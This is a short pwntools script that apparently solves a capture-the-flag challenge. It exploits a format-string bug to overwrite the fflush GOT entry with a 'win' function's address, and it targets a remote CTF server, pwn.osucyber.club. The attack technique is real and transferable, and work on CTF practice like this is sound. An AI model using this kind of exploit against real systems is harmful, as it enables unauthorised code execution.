from pwn import *

path_to_binary = "./challenge/chall_10"
EXE = ELF(path_to_binary)
context.binary = EXE
context.log_level = "DEBUG"

win_address = EXE.symbols['win']
fflush_got = EXE.got['fflush']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13381)
	return r

io = conn(False)

io.recvline()
io.sendline(b'bananas')

# Found the offset (6) by running the function myself with an input of "%x %x %x %x %x %x %x %x %x %x %x "
# and finding when the input buffer started (when the response started being 25207825)
payload = fmtstr_payload(6,{fflush_got: win_address})

io.sendline(payload)

io.interactive()

io.close()